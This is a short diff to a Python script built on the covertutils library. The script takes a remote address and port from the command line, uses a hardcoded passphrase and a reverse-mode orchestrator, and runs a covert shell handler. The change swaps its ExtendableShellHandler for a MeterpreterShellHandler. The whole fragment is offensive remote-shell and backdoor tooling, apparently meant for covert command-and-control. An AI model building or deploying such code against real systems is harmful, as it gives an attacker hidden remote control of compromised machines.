@@ -1,12 +1,11 @@
 #!/usr/bin/env python
-from covertutils.handlers.impl import StandardShellHandler, ExtendableShellHandler
+from covertutils.handlers.impl import MeterpreterShellHandler
+# from covertutils.shells.impl import SimpleShellHandler
 from covertutils.orchestration import SimpleOrchestrator
 
 import sys
 import socket
 from time import sleep
-
-from hashlib import sha512
 
 passphrase = "Pa55phra531"
 addr = sys.argv[1], int(sys.argv[2])
@@ -46,6 +45,6 @@ while True :
 		return s.send( raw )
 
 	orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, reverse = True )
-	handler = ExtendableShellHandler( recv, send, orch )	# Create the Handler Daemon Thread
+	handler = MeterpreterShellHandler( recv, send, orch )	# Create the Handler Daemon Thread
 
 	while not closed : sleep(1)
